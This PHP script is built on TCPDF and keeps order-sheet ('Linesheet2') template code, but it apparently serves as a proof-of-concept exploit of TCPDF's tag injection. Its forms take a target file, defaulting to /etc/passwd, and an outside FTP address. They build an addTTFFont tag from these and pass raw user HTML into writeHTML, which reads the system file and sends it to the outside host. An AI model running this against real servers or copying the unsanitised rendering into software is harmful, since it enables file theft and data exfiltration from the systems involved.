<?
	//Class Extention for header and footer
	#require_once("tpl.doc.php");
require_once('config/lang/eng.php');
require_once('tcpdf.php');
	set_time_limit(0);
/**
 * @author frans
 * @created 11 jun 2011
 */

	Class ordersheet extends TCPDF {
		function Header() {
			$this->writeHTML('473A', true, 0, true, 0);
			#$this->writeHTML('<input type="text" name="header1" value="" />', true, 0, true, 0);
		}
		function Footer() {
			$this->writeHTML('Namn på drop', true, 0, true, 0);
			$this->writeHTML('1', true, 0, true, 0);
		}
	
	}
	$pdf = new ordersheet('L', 'mm', 'a4', true, 'UTF-8', false);

// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('SilkVMS');
$pdf->SetTitle('Linesheet2');
$pdf->SetSubject('Linesheet2');
$pdf->SetKeywords('Linesheet2');
#$pdf->setFontSubsetting(false);

// set default header data
#$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, PDF_HEADER_TITLE.' 048', PDF_HEADER_STRING);

// set header and footer fonts
#$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
#$pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));

// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);

//set margins
$pdf->SetMargins(15, 18, 15);
$pdf->SetHeaderMargin(2);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);

//set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);

//set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);

//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------

// set font
$pdf->SetFont('helvetica', 'B', 20);

// add a page
$pdf->AddPage();
#$pdf->SetFont('courier', '', 8);

if(!@$_POST['step']) @$_POST['step'] = 0;
$i = 0;
ini_set('display_errors', true);


if(@$_POST['step'] == '1') {
	#echo '<plaintext>';
	$params = TCPDF_STATIC::serializeTCPDFtagParameters(array(@$_POST['name'],'TrueType','',255,urldecode($_POST['ftp'])));
	
?>
Create PDF-file:<br />
<form action="" method="POST">
<input type="hidden" name="step" value="2" />
<textarea name="html" style="width: 600px; height: 400px;"><?=htmlentities('<tcpdf method="addTTFFont" params="'.$params.'" />')?></textarea><br />
<input type="submit" />
</form>
<?
	die;
} else if(@$_POST['step'] == '0') {
	?>
	What File?:<br />
	<form action="" method="POST">
<input type="hidden" name="step" value="1" />
	<input name="name" value="/etc/passwd"><br />
	FTP-address:<br />
	<input name="ftp" value="ftp://ftp.bahnhof.se/"><br />
	<input type="submit" />
	</form>
	<?
		die;
} else if(@$_POST['step'] == '2') {
	
}
#die;
#die;
#$pdf->addTTFfont($fontfile)
//<tcpdf method="addTTFFont" params="{$params}" />
$nb = NULL;
$html = @stripslashes($_POST['html']);
$tbl = <<<EOD
<table width="100%">
<tr>
	<td>
		<table>
		<tr><td></td></tr>
		<tr><td><h1>Example PDF</h1></td></tr>
		<tr><td>Input:</td></tr>
		<tr><td>{$html}</td></tr>
		</table>
	</td>
</tr>
</table>

EOD;
#foreach($res as $line) {

#$pdf->writeHTML($tbl, true, false, false, false, '');

#print $tbl;
#die;
$pdf->writeHTML($tbl, true, 0, true, 0);


$pdf->Output('linesheet-yeah.pdf', 'I');